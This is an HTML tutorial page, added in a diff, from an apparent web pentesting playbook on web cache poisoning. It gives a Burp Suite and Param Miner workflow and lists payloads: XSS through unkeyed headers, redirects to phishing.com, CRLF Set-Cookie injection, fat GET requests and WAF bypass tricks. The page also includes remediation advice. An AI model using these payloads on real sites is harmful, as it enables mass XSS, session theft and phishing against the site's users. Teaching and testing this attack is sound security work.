@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <!-- Clickjacking defense: hide content until JS confirms top frame -->
+  <style id="cj-guard">html{display:none!important}</style>
+  <script>(function(){if(self===top){var s=document.getElementById('cj-guard');if(s)s.parentNode.removeChild(s);}else{try{top.location.href=self.location.href;}catch(e){}}})();</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Web cache poisoning testing guide: unkeyed header injection, cache deception attacks, and poisoning via fat GET requests.">
+    <meta property="og:title" content="Web Cache Poisoning – Web App Pentesting Guide">
+    <meta property="og:description" content="Web cache poisoning testing guide: unkeyed header injection, cache deception attacks, and poisoning via fat GET requests.">
+    <meta property="og:type" content="article">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%237c3aed' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/%3E%3C/svg%3E">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <title>Web Cache Poisoning  · Web Pentest Playbook</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<nav class="topnav">
+  <div class="nav-logo">
+    <a href="../index.html" class="logo-link">
+      <div class="logo-icon">
+        <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><path d="M5 9v3M9 9v3M3.5 12h7" stroke="#a78bfa" stroke-width="1.2" stroke-linecap="round"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+      </div>
+      <span class="logo-text">Web Pentest</span>
+      <span class="logo-tag">v2025</span>
+    </a>
+  </div>
+  <div class="nav-center">
+    <a href="../index.html" class="nav-link">Home</a>
+    <a href="../index.html" class="nav-link active">Vulnerabilities</a>
+    <a href="../web-pentest-playbook.html" class="nav-link">Playbook</a>
+    <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="nav-link">Labs ↗</a>
+    <a href="../thanks.html" class="nav-link">Thanks</a>
+  </div>
+  <div class="nav-right">
+    <button class="search-pill" onclick="gsOpen ? gsOpen() : null">
+      <svg width="11" height="11" viewBox="0 0 16 16" fill="none"><circle cx="7" cy="7" r="5" stroke="currentColor" stroke-width="1.5"/><path d="m11 11 3 3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
+      Search <kbd>⌘K</kbd>
+    </button>
+    <button class="hamburger" id="hamburger" aria-label="Menu">☰</button>
+    <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme">☀ Light</button>
+  </div>
+</nav>
+<div class="sidebar-overlay" id="sidebar-overlay"></div>
+<div class="layout">
+  <nav id="sidebar">
+    <div class="toc-title">Web Cache Poisoning</div>
+    <div class="sb-group">Overview</div>
+    <a href="#analogy">Real-World Analogy</a>
+    <a href="#methodology">📅 Workflow Placement</a>
+    <a href="#how-it-works">How It Works</a>
+    <div class="sb-group">Attack Vectors</div>
+    <a href="#where-to-look">Where to Look</a>
+    <div class="sb-group">Exploitation</div>
+    <a href="#burp-workflow">Burp Workflow</a>
+    <a href="#payloads">Payloads & Techniques</a>
+    <a href="#waf-bypass">🛡️ WAF Bypass</a>
+    <a href="#exploitation">Exploitation & Impact</a>
+    <div class="sb-group">Practice</div>
+    <a href="#checklist">Testing Checklist</a>
+    <a href="#remediation">Remediation</a>
+    <a href="#labs">PortSwigger Labs</a>
+    <a href="#mistakes">Common Mistakes</a>
+    <a href="#see-also">See Also</a>
+  </nav>
+  <main id="main">
+    <div class="hero">
+      <div class="hero-chip"><span class="hero-chip-dot"></span>OWASP A03 · CVSS 8.1 · Day 5</div>
+      <h1><span class="hero-icon-pill"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M21 11a9 9 0 1 0-18 0c0 4 2 6 4 7v3a1 1 0 0 0 1 1h2v-3h4v3h2a1 1 0 0 0 1-1v-3c2-1 4-3 4-7z"/><circle cx="9" cy="12" r="1.5"/><circle cx="15" cy="12" r="1.5"/><path d="M9 17h6"/></svg></span><span>Web Cache Poisoning</span></h1>
+      <p>Web Cache Poisoning is an advanced attack where an attacker manipulates an unkeyed input (a header or parameter that affects the response but isn't part of the cache key) to inject malicious content into the cache. All subsequent users requesting the same resource receive the poisoned version, making this a high-impact vulnerability affecting multiple victims simultaneously.</p>
+      <div class="badge-row">
+        <span class="badge badge-high">HIGH</span>
+        <span class="badge badge-bscp">BSCP</span>
+        <span class="badge badge-difficulty">Advanced</span>
+      </div>
+    </div>
+
+    <section id="analogy">
+      <h2>Real-World Analogy</h2>
+      <div class="callout analogy">
+        <div class="callout-title">📖 The Library's Photocopy Machine</div>
+        <p>A library photocopies popular books to save time. They file the original and keep photocopies at the counter. An attacker sneaks in and replaces a page in the original book before the next photocopy is made. From that moment on, every patron who requests a copy receives the tampered version. The librarian never knows the original was corrupted  · it's filed in the back. Web cache poisoning works the same way: the attacker injects a malicious input that modifies the response before it's cached, and then every user receives the poisoned version.</p>
+      </div>
+    </section>
+
+    <section id="methodology">
+      <h2>📅 When in the 5-Day Workflow</h2>
+      <div class="workflow-days">
+        <div class="day-pill"><span class="day-num">Day 1</span>Recon</div>
+        <div class="day-pill"><span class="day-num">Day 2</span>Auth/IDOR</div>
+        <div class="day-pill"><span class="day-num">Day 3</span>File/CSRF</div>
+        <div class="day-pill"><span class="day-num">Day 4</span>Initial Probe</div>
+        <div class="day-pill deep"><span class="day-num">Day 5</span>Deep Dive</div>
+      </div>
+
+      <div class="callout method-probe">
+        <div class="callout-title">🎯 Day 4  · Identify Cached Responses</div>
+        <p>On Day 4, start by finding endpoints that are cached. Look for response headers like <code>X-Cache: HIT</code>, <code>CF-Cache-Status: HIT</code>, <code>Age</code>, or <code>Cache-Control: public</code>. These indicate a caching layer is in front of the origin server. Install the Param Miner Burp extension  · it will help you discover unkeyed inputs automatically.</p>
+      </div>
+
+      <div class="callout method-deep">
+        <div class="callout-title">🎯 Day 5  · Deep Dive into Cache Poisoning</div>
+        <p>On Day 5, for every cached endpoint, use Param Miner to find unkeyed headers that affect the response. Once found, craft a request with a malicious payload (XSS, redirect, etc.) via the unkeyed header. First, confirm the injection in the response. Then, remove Cache-Control: no-cache and resend  · if the response is cached with your payload, you've achieved cache poisoning. All future users get the poisoned version.</p>
+      </div>
+    </section>
+
+    <section id="how-it-works">
+      <h2>How It Works</h2>
+      <p>Caches use a cache key to identify unique requests. Typically the cache key includes:</p>
+      <ul>
+        <li>HTTP method (GET, POST)</li>
+        <li>Request path (/api/user, /product/123)</li>
+        <li>Query parameters (?page=1)</li>
+      </ul>
+      <p><strong>The vulnerability:</strong> If a header or parameter affects the response but is NOT in the cache key, an attacker can submit two requests that the cache treats as identical (same cache key) but that the origin server responds to differently (different header value). The second request can poison the cache.</p>
+      <p><strong>Attack flow:</strong></p>
+      <ol class="steps">
+        <li>Attacker sends request with unkeyed header containing XSS payload.</li>
+        <li>Origin server reflects the payload in the response.</li>
+        <li>Attacker confirms XSS appears in the response body.</li>
+        <li>Attacker removes Cache-Control: no-cache (which prevents caching) and resends.</li>
+        <li>Cache layer sees the request matches previous requests (same cache key) but the response is new, so it caches the poisoned version.</li>
+        <li>All subsequent users receive the poisoned cached response with the XSS payload.</li>
+      </ol>
+      <p><strong>Why it works:</strong> Caches don't validate the origin server's response  · they trust it. If the origin server includes user input in the response without sanitizing, the cache stores that user input. The attacker controls the user input via an unkeyed header.</p>
+    </section>
+
+    <section id="where-to-look">
+      <h2>Where to Look</h2>
+      <p>Cache poisoning is only possible on cached endpoints. Look for these indicators:</p>
+      <ul>
+        <li><strong>Cache headers in response:</strong> <code>X-Cache: HIT</code>, <code>CF-Cache-Status: HIT</code>, <code>Age</code>, <code>Cache-Control: public, max-age=X</code></li>
+        <li><strong>Content Delivery Networks (CDNs):</strong> Cloudflare, Akamai, AWS CloudFront, Fastly. These aggressively cache static and dynamic content.</li>
+        <li><strong>Reverse proxies:</strong> Nginx with caching enabled, Varnish, Squid.</li>
+        <li><strong>Endpoints serving:</strong> JavaScript files, CSS, HTML pages, API responses that are marked cacheable.</li>
+        <li><strong>Headers that reflect user input:</strong> <code>X-Original-URL</code>, <code>X-Forwarded-Host</code>, <code>X-Rewrite-URL</code>, <code>Referer</code>, <code>User-Agent</code>  · any header that might be used to construct a response.</li>
+      </ul>
+      <p><strong>Difference from SSRF:</strong> SSRF requires the server to fetch a URL you control. Cache poisoning requires the cache to serve your poisoned response to other users.</p>
+    </section>
+
+    <section id="burp-workflow">
+      <h2>Burp Suite Workflow</h2>
+
+      <div class="burp-step">
+        <div class="step-num">1</div>
+        <div>
+          <strong>Install Param Miner extension.</strong> Go to Burp Extensions → BApp Store → search for "Param Miner" by albinowax. Install it. This extension automatically discovers unkeyed inputs that affect responses.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">2</div>
+        <div>
+          <strong>Identify a cached endpoint.</strong> Navigate to any resource (HTML page, JavaScript, API endpoint) and check the response headers. Look for <code>X-Cache: HIT</code> or <code>Age</code> or <code>CF-Cache-Status</code>.
+          <pre><code>GET /index.html HTTP/1.1
+...
+Response Headers:
+X-Cache: HIT
+Age: 3600
+Cache-Control: public, max-age=86400</code></pre>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">3</div>
+        <div>
+          <strong>Use Param Miner to find unkeyed inputs.</strong> Right-click the request → Extensions → Param Miner → Scan for cache unkeyed inputs. Param Miner will test dozens of headers automatically and report which ones affect the response but aren't in the cache key.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">4</div>
+        <div>
+          <strong>Inject XSS payload via unkeyed header.</strong> Once Param Miner finds an unkeyed header (e.g., <code>X-Forwarded-Host</code>), send the request to Repeater and inject an XSS payload:
+          <pre><code>GET /index.html HTTP/1.1
+Host: target.com
+X-Forwarded-Host: attacker.com">
+Cache-Control: no-cache
+
+Response includes:
+&lt;a href="https://attacker.com">&gt;...&lt;/a&gt;</code></pre>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">5</div>
+        <div>
+          <strong>Confirm injection in response body.</strong> Check that your payload appears in the response. If it does, you have an injection point.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">6</div>
+        <div>
+          <strong>Remove Cache-Control and resend to poison the cache.</strong> Delete the <code>Cache-Control: no-cache</code> header from your request and resend:
+          <pre><code>GET /index.html HTTP/1.1
+Host: target.com
+X-Forwarded-Host: attacker.com"></code></pre>
+          If the cache now returns the response (check <code>X-Cache: HIT</code>), the cache has been poisoned.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">7</div>
+        <div>
+          <strong>Verify poisoning from a different IP/user agent.</strong> Open a new tab, incognito mode, or use a different device to access the same endpoint. If you see your injected payload, cache poisoning is confirmed.
+        </div>
+      </div>
+
+    </section>
+
+    <section id="payloads">
+      <h2>Payloads & Techniques</h2>
+
+      <h3>XSS via Unkeyed Headers</h3>
+      <pre><code>X-Forwarded-Host: attacker.com">
+X-Original-URL: /"><script>alert('xss')</script><img src="
+X-Rewrite-URL: javascript:alert('xss')
+X-Forwarded-Scheme: /javascript:alert('xss')</code></pre>
+
+      <h3>Redirect Poisoning</h3>
+      <pre><code>X-Forwarded-Host: phishing.com
+X-Original-URL: //phishing.com/fake-login
+Referer: https://phishing.com/</code></pre>
+
+      <h3>Response Header Injection</h3>
+      <p>Inject newlines to add arbitrary response headers:</p>
+      <pre><code>X-Forwarded-Host: attacker.com
+X-Header-Injection: value%0d%0aSet-Cookie: admin=true</code></pre>
+
+      <h3>CSS/JS Injection via Content-Type</h3>
+      <pre><code>X-Original-URL: /page.html
+X-Rewrite-URL: /page.css
+
+(Attacker crafts response that looks like CSS but contains JS)</code></pre>
+
+      <h3>Unkeyed Query String Injection</h3>
+      <p>Some caches don't key on query strings, or only key on specific parameters:</p>
+      <pre><code>GET /api/products?page=1&utm_source=attacker.com"><script>alert(1)</script>
+
+Cache may store this as:
+GET /api/products (ignoring query params)
+All users get the poisoned response</code></pre>
+
+      <h3>Param Miner Common Findings</h3>
+      <pre><code>X-Forwarded-For: attacker.com
+X-Forwarded-Host: attacker.com
+X-Forwarded-Scheme: attacker.com
+X-Original-URL: /malicious
+X-Rewrite-URL: /malicious
+X-Client-IP: attacker.com
+X-HTTP-Host-Override: attacker.com</code></pre>
+
+    </section>
+
+    <section id="checklist">
+      <h2>Testing Checklist</h2>
+      <div class="checklist-wrap">
+        <div class="checklist-header">
+          Progress: <span class="progress-mini">0/11</span>
+          <div class="progress-bar-wrap"><div class="progress-bar"></div></div>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check1">
+          <label for="check1">Identify all cached endpoints (check X-Cache, Age, CF-Cache-Status headers)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check2">
+          <label for="check2">Install Param Miner extension in Burp</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check3">
+          <label for="check3">Run Param Miner scan on cached endpoints to find unkeyed inputs</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check4">
+          <label for="check4">Test manual header injection (X-Forwarded-Host, X-Original-URL)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check5">
+          <label for="check5">Confirm XSS/injection payload appears in response body</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check6">
+          <label for="check6">Remove Cache-Control: no-cache and resend to poison cache</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check7">
+          <label for="check7">Verify poisoning is cached (check X-Cache: HIT)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check8">
+          <label for="check8">Test from different IP/user agent to confirm persistence across users</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check9">
+          <label for="check9">Test redirect poisoning via unkeyed headers</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check10">
+          <label for="check10">Test response header injection (newline injection for Set-Cookie, etc.)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check11">
+          <label for="check11">Test CSS/JS file injection via Content-Type confusion</label>
+        </div>
+      </div>
+    </section>
+
+    <section id="waf-bypass">
+      <h2>WAF Bypass Techniques</h2>
+
+      <h3>Cache Key Header Variation</h3>
+      <p>Different capitalisations of headers that are unkeyed. Some caches normalise; some WAFs only inspect one form.</p>
+      <pre><code>X-Forwarded-Host: attacker.com
+x-forwarded-host: attacker.com
+X-FORWARDED-HOST: attacker.com</code></pre>
+
+      <h3>Delimiter Injection in Keyed Parameters</h3>
+      <p>Inject <code>?utm_content=x;injected=y</code>. Some caches treat <code>;</code> as a parameter delimiter and include only <code>utm_content</code> in the cache key, while the backend sees <code>injected</code> as a separate parameter.</p>
+      <pre><code>GET /page?utm_content=x;injected=y HTTP/1.1</code></pre>
+
+      <h3>Fat GET Requests</h3>
+      <p>Send a GET request with a body: <code>GET /page HTTP/1.1\r\n...\r\n\r\ninjected=payload</code>. Some caches key only on the URL; some backends process the body. WAFs often don't inspect GET request bodies.</p>
+      <pre><code>GET /page HTTP/1.1
+Host: example.com
+Content-Length: 18
+
+injected=payload</code></pre>
+
+      <h3>Cache Buster Bypass</h3>
+      <p>WAFs may add cache-busting parameters to protected requests. Strip them using parameter pollution: <code>?cb=waf_added&cb=</code>  · some caches use the last value (empty), defeating the buster.</p>
+      <pre><code>GET /page?cb=waf_added&cb= HTTP/1.1</code></pre>
+
+      <h3>Vary Header Exploitation</h3>
+      <p>If the cache <code>Vary</code>s on <code>Accept-Encoding</code>, send <code>Accept-Encoding: gzip, evil-value</code>. The poisoned cache entry is served to victims whose browsers send <code>gzip</code>.</p>
+      <pre><code>Accept-Encoding: gzip, evil-value</code></pre>
+
+      <h3>Response Header Injection via Unkeyed Headers</h3>
+      <p><code>X-Forwarded-Scheme: http</code> forces a redirect stored in cache. WAFs that only inspect request paths miss header-based injection targeting cache-stored redirects.</p>
+      <pre><code>X-Forwarded-Scheme: http</code></pre>
+
+    </section>
+
+    <section id="exploitation">
+      <h2>Exploitation & Impact</h2>
+
+      <h3>Stored XSS via Cache Poisoning</h3>
+      <p><strong>Impact: Critical.</strong> Inject XSS via an unkeyed header, poison the cache, and every user who visits the endpoint gets XSS.</p>
+      <ul>
+        <li>Steal session cookies from all users.</li>
+        <li>Perform actions on behalf of all users.</li>
+        <li>Redirect all users to a phishing page.</li>
+        <li>Modify the page content for all users.</li>
+      </ul>
+
+      <h3>Redirect Poisoning</h3>
+      <p><strong>Impact: High.</strong> Poison the cache with a redirect to a phishing or malware site. Every user is redirected.</p>
+      <pre><code>Attacker poisons cache with:
+Location: https://phishing.com/fake-login
+
+All users hit the poisoned cache and are redirected to phishing.com</code></pre>
+
+      <h3>Denial of Service</h3>
+      <p><strong>Impact: Medium.</strong> Cache a 404 or 500 error response for a critical endpoint. All users receive an error.</p>
+
+      <h3>Response Header Injection (Cookie Poisoning)</h3>
+      <p><strong>Impact: High.</strong> Inject newlines to add a malicious Set-Cookie header. Every user receives the poisoned cookie.</p>
+      <pre><code>X-Header: value
+Set-Cookie: admin=true; Path=/
+
+(Cached as part of response, affecting all users)</code></pre>
+
+      <h3>Content-Type Confusion (JS/CSS Injection)</h3>
+      <p><strong>Impact: High.</strong> If a cache doesn't validate Content-Type, serve JavaScript with CSS extension, or vice versa. Depending on how the client interprets it, you can achieve arbitrary code execution or script injection.</p>
+
+    </section>
+
+    <section id="remediation">
+      <h2>Remediation</h2>
+
+      <h3>1. Include All Response-Affecting Inputs in Cache Key</h3>
+      <p>Use the HTTP <code>Vary</code> header to tell caches which inputs affect the response:</p>
+      <pre><code>Vary: Host, X-Forwarded-Host, Accept-Encoding
+
+// This tells the cache: "If Host or X-Forwarded-Host differs, treat it as a different request"</code></pre>
+
+      <h3>2. Don't Reflect Request Headers in Responses</h3>
+      <p>Avoid reflecting headers directly into the response body:</p>
+      <pre><code>// Bad: reflects request header
+response.write("Cache for: " + request.headers['x-original-url']);
+
+// Good: use a configured value
+response.write("Cache for: " + config.primaryDomain);</code></pre>
+
+      <h3>3. Disable Caching for Dynamic Content</h3>
+      <p>Use <code>Cache-Control: no-store</code> or <code>Cache-Control: private</code> for responses that contain user-specific or dynamic content:</p>
+      <pre><code>if (responseContainsUserData || responseContainsUserInput) {
+  response.setHeader('Cache-Control', 'no-store');
+}</code></pre>
+
+      <h3>4. Validate and Sanitize Reflected Headers</h3>
+      <p>If you must use headers in responses, validate and sanitize them:</p>
+      <pre><code>const ALLOWED_HOSTS = ['example.com', 'www.example.com'];
+const host = request.headers['x-forwarded-host'];
+if (!ALLOWED_HOSTS.includes(host)) {
+  return response.status(400).send('Invalid Host');
+}</code></pre>
+
+      <h3>5. Use CSP to Prevent XSS</h3>
+      <p>Even if cache poisoning succeeds with XSS, a strong CSP can block it:</p>
+      <pre><code>Content-Security-Policy: default-src 'self'; script-src 'self';</code></pre>
+
+      <h3>6. Configure Cache Layer Properly</h3>
+      <p>Educate your cache layer (CDN, reverse proxy) about what should and shouldn't be cached:</p>
+      <ul>
+        <li>Don't cache responses with Set-Cookie headers.</li>
+        <li>Don't cache responses with Authorization headers.</li>
+        <li>Do cache only responses with explicit Cache-Control headers.</li>
+      </ul>
+
+      <h3>7. Monitor Cache Hit Ratio and Anomalies</h3>
+      <p>Alert if cache hit ratio unexpectedly changes, or if unexpected content is being served from cache.</p>
+
+    </section>
+
+    <section id="labs">
+      <h2>PortSwigger Labs</h2>
+      <p>Practice Web Cache Poisoning on PortSwigger's free labs. These range from simple unkeyed header discovery to complex multi-step poisoning attacks:</p>
+      <ul>
+        <li>Web cache poisoning with an unkeyed header</li>
+        <li>Web cache poisoning with an unkeyed cookie</li>
+        <li>Web cache poisoning with multiple headers</li>
+        <li>Targeted web cache poisoning using an unknown header</li>
+        <li>Web cache poisoning via a fat GET request</li>
+        <li>Web cache poisoning with response header injection</li>
+        <li>Web cache poisoning via a normalized cache key</li>
+        <li>Web cache poisoning via ambiguous requests</li>
+        <li>Cache buster DoS</li>
+        <li>Web cache poisoning and JavaScript injection</li>
+        <li>Polyglot cache poisoning</li>
+        <li>DOM-based cache poisoning</li>
+        <li>Cache poisoning via a reflected XSS</li>
+      </ul>
+      <p>Visit <code>portswigger.net/web-security/web-cache-poisoning</code> to access the labs.</p>
+    </section>
+
+    <section id="mistakes">
+      <h2>Common Beginner Mistakes</h2>
+
+      <div class="callout warn">
+        <div class="callout-title">Not Using Param Miner Extension</div>
+        <p><strong>Mistake:</strong> Manually testing headers without Param Miner. There are dozens of unkeyed headers to test; manual testing is tedious and you'll miss most of them. <strong>Fix:</strong> Always use Param Miner. It's fast and discovers unkeyed inputs automatically.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Not Checking Cache Headers</div>
+        <p><strong>Mistake:</strong> Testing endpoints that aren't cached, or assuming an endpoint is cached without checking the response headers. <strong>Fix:</strong> Always check for X-Cache, Age, CF-Cache-Status, or Cache-Control headers. If they don't indicate caching, the endpoint isn't cached and can't be poisoned.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Forgetting to Remove Cache-Control: no-cache</div>
+        <p><strong>Mistake:</strong> Testing injection with Cache-Control: no-cache, confirming the injection works, but then forgetting to remove it before trying to poison the cache. <strong>Fix:</strong> To poison the cache, you MUST remove Cache-Control: no-cache, no-store, and any other cache-busting headers.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Not Testing from Different Clients</div>
+        <p><strong>Mistake:</strong> Injecting a payload but not verifying it's actually cached by visiting from a different IP/browser/incognito window. <strong>Fix:</strong> After poisoning, always verify by accessing the endpoint from a fresh client (different IP, different browser, incognito mode) to confirm the poisoned response is being served.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Missing Response Header Injection</div>
+        <p><strong>Mistake:</strong> Only testing for body injection (XSS) and missing header injection opportunities. <strong>Fix:</strong> Test for newline injection (%0d%0a) in headers to inject Set-Cookie or Location headers. These are often even more dangerous than body injection.</p>
+      </div>
+
+    </section>
+
+    <section id="see-also">
+      <h2>See Also</h2>
+      <div class="see-also-grid">
+        <a href="host-header.html" class="see-also-card">
+          <h3>🏷️ Host Header Injection</h3>
+          <p>Host header attacks often chain with cache poisoning to affect multiple users.</p>
+        </a>
+        <a href="xss.html" class="see-also-card">
+          <h3>💉 XSS</h3>
+          <p>Cache poisoning often delivers XSS payloads that affect all cached users.</p>
+        </a>
+        <a href="request-smuggling.html" class="see-also-card">
+          <h3>🚢 Request Smuggling</h3>
+          <p>Request smuggling can be used to poison caches on affected systems.</p>
+        </a>
+        <a href="csrf.html" class="see-also-card">
+          <h3>⚔️ CSRF</h3>
+          <p>Cache poisoning can deliver CSRF attacks to all users of a cached endpoint.</p>
+        </a>
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<script>
+document.querySelectorAll('pre').forEach(pre => {
+  const btn = document.createElement('button');
+  btn.className = 'copy-btn'; btn.textContent = 'Copy';
+  pre.appendChild(btn);
+  btn.addEventListener('click', () => {
+    navigator.clipboard.writeText(pre.querySelector('code')?.innerText || pre.innerText);
+    btn.textContent = 'Copied!'; btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+});
+const sections = document.querySelectorAll('[id]');
+const navLinks = document.querySelectorAll('#sidebar a');
+const observer = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) navLinks.forEach(a => a.classList.toggle('active', a.getAttribute('href') === '#' + e.target.id));
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+sections.forEach(s => observer.observe(s));
+const STORAGE_KEY = 'cache-poison-checklist-';
+document.querySelectorAll('.checklist-item input[type=checkbox]').forEach((cb, i) => {
+  const saved = localStorage.getItem(STORAGE_KEY + i);
+  if (saved === 'true') { cb.checked = true; cb.closest('.checklist-item').classList.add('done'); }
+  cb.addEventListener('change', () => {
+    localStorage.setItem(STORAGE_KEY + i, cb.checked);
+    cb.closest('.checklist-item').classList.toggle('done', cb.checked);
+    updateProgress();
+  });
+});
+function updateProgress() {
+  document.querySelectorAll('.checklist-wrap').forEach(wrap => {
+    const all = wrap.querySelectorAll('input[type=checkbox]');
+    const done = wrap.querySelectorAll('input[type=checkbox]:checked');
+    const mini = wrap.querySelector('.progress-mini');
+    const bar = wrap.querySelector('.progress-bar');
+    if (mini) mini.textContent = done.length + '/' + all.length;
+    if (bar) bar.style.width = (all.length ? (done.length/all.length*100) : 0) + '%';
+  });
+}
+updateProgress();
+</script>
+<script>
+(function(){
+  var t = localStorage.getItem('theme') || 'dark';
+  document.documentElement.setAttribute('data-theme', t);
+  var btn = document.getElementById('theme-toggle');
+  if(btn){
+    btn.textContent = t === 'dark' ? '☀ Light' : '🌙 Dark';
+    btn.addEventListener('click', function(){
+      var n = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+      document.documentElement.setAttribute('data-theme', n);
+      localStorage.setItem('theme', n);
+      btn.textContent = n === 'dark' ? '☀ Light' : '🌙 Dark';
+    });
+  }
+  var ham = document.getElementById('hamburger');
+  var sb = document.getElementById('sidebar');
+  var ov = document.getElementById('sidebar-overlay');
+  if(ham && sb && ov){
+    ham.addEventListener('click', function(){ sb.classList.toggle('open'); ov.classList.toggle('open'); });
+    ov.addEventListener('click', function(){ sb.classList.remove('open'); ov.classList.remove('open'); });
+  }
+})();
+</script>
+<script src="search.js"></script>
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <a href="../index.html" class="footer-logo-link">
+          <div class="footer-logo-icon">
+            <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg" width="15" height="15"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+          </div>
+          <span class="footer-logo-text">Web Pentest Playbook</span>
+        </a>
+        <p class="footer-tagline">A workflow-first reference for web application security testing.</p>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Vulnerabilities</div>
+        <a href="sqli.html" class="footer-link">SQL Injection</a>
+        <a href="xss.html" class="footer-link">XSS</a>
+        <a href="ssrf.html" class="footer-link">SSRF</a>
+        <a href="jwt.html" class="footer-link">JWT Attacks</a>
+        <a href="../index.html" class="footer-link">+ 19 more →</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Resources</div>
+        <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="footer-link">PortSwigger Academy ↗</a>
+        <a href="https://owasp.org/Top10" target="_blank" rel="noopener noreferrer" class="footer-link">OWASP Top 10 ↗</a>
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer" class="footer-link">PayloadsAllTheThings ↗</a>
+        <a href="https://book.hacktricks.xyz" target="_blank" rel="noopener noreferrer" class="footer-link">HackTricks ↗</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">About</div>
+        <a href="../web-pentest-playbook.html" class="footer-link">5-Day Playbook</a>
+        <a href="../index.html" class="footer-link">All Vulnerabilities</a>
+        <a href="../thanks.html" class="footer-link">Special Thanks</a>
+        <a href="https://github.com/eligof/WebSec" target="_blank" rel="noopener noreferrer" class="footer-link">GitHub ↗</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span>© 2025 Web Pentest Playbook · MIT License</span>
+      <span>Inspired by <a href="../thanks.html">Tomer Hadad</a></span>
+    </div>
+  </div>
+</footer>
+</body>
+</html>
